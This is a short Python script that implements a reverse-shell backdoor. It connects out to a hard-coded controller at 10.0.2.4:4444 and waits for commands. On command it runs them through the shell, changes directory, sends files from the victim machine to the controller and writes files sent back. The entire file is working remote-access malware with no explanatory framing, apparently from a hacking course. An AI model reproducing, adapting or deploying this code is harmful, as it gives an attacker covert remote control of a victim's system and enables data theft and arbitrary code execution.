import socket
import subprocess
import json 
import os
import base64
from util import Util

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError:
            return "[-] Error during command exeception"

    def change_dir_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path
 
    def run(self):
        while True:
            command = Util.utilize_receive(self.connection)

            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()

                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_dir_to(command[1])

                elif command[0] == "download":
                    command_result = Util.read_file(command[1]).decode()
                        
                elif command[0] == "upload":
                    command_result = Util.write_file(command[1], command[2])

                else:
                    command_result = self.execute_system_command(command).decode()
            except Exception:
                command_result = "[-] Error during command execution"

            Util.utilize_send(self.connection, command_result)


my_backdoor = Backdoor("10.0.2.4", 4444)
my_backdoor.run()